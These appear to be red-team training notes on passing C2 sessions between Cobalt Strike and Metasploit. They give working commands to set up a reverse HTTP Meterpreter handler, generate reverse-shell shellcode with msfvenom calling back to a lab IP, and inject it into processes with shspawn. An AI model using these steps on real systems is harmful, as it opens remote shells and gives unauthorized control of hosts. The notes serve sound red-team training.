# Session Passing

Session passing spawns a new C2 session from one payload/listener type to another e.g., a long-haul DNS beacon can spawn a short-haul HTTP beacon. Can also pass sessions between different C2 frameworks, such as spawning a Meterpreter session from a CS beacon. Good to:

* Use a capability within a framework that Cobalt Strike doesn't have
* Backup access in the event the current access is lost
* Emulate specific TTPs

## Beacon Passing

```spawn x64 http``` spawns a process and injects shellcode for the specified listener into it. For example, a DNS Beacon checking in from bfarmer every 1 minute left open as a lifeline on a slow check-in and a new HTTP session that checks in more frequently can be spawned and work done from there instead.

## Foreign Listener

Stages Meterpreter HTTP/HTTPS implants from Beacon or any implant that supports the MSF staging protocol. Only supports x86 staged payloads. Start msfconsole and create a new reverse HTTP Meterpreter listener:

    attacker@ubuntu ~> sudo msfconsole -q
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
    msf6 exploit(multi/handler) > set LHOST ens5
    msf6 exploit(multi/handler) > set LPORT 8080    /// Don't use a port CS is listening on
    msf6 exploit(multi/handler) > run

CS: Listener Management > create a new Foreign HTTP listener.  Enter the stager host and port from the MSF handler. The listener is available within all the relevant Beacon commands such as spawn, jump, and elevate (e.g. ```spawn msf``` will spawn a process and inject Meterpreter shellcode into it, giving a Meterpreter session).

## Spawn & Inject

shinject (existing proc) and shspawn (new proc) allow injection of arbitrary shellcode blobs. 

1: Change the multi handler to use a stageless x64 Meterpreter payload:

    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
    msf6 exploit(multi/handler) > exploit

2: Generate the associated payload using msfvenom inside WSL, and save the output to Payloads directory:

    ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

3: spawn a process and inject it:

    beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
